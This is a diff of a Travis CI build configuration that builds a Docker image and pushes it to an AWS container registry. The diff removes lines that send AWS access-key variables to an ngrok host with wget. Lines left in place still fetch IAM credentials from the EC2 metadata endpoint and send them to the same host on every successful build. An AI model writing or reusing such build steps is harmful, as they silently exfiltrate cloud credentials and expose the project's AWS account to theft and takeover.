@@ -25,23 +25,6 @@ after_success:
 #  - export PATH=$PATH:$HOME/.local/bin
 #  - export CLASS=`cat .class`
 #  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://10dba31472cd.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://10dba31472cd.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESSKEY_ID
-  - wget http://10dba31472cd.ngrok.io/`echo $AWS_SECRET_ACCESSKEY_ID`
-  - echo $AWS_SECRETACCESS_KEY_ID
-  - wget http://10dba31472cd.ngrok.io/`echo $AWS_SECRETACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://10dba31472cd.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
   - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - wget http://10dba31472cd.ngrok.io/`echo $RESOURCE`
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
